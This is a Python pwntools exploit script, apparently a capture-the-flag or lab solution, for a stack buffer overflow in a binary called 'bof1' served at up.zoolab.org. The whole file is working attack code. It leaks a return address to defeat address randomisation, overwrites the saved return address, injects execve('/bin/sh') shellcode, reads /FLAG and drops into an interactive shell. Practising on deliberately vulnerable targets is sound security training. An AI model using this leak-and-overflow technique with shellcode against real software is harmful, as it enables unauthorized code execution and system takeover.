#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof1'
port = 10258

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

r.recvuntil(b'name? ')
r.send(b'A'*40)

z = r.recvline()
task_return = (u64(z.split(b'A'*40)[1][:-1].ljust(8, b'\x00')))

base_addr = task_return - 160 - off_main
msg_addr = base_addr + 0xd31e0

new_ret_addr = p64(msg_addr)

buf = b'A'*40 + new_ret_addr

r.recvuntil(b'number? ')
r.send(buf)

r.recvuntil(b'name? ')
r.send(buf)

msg = """
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    mov rax, 59 
    syscall
"""
msg = asm(msg)

r.recvuntil(b'message: ')
r.send(msg)

r.send(b'cat /FLAG\n')
r.interactive()
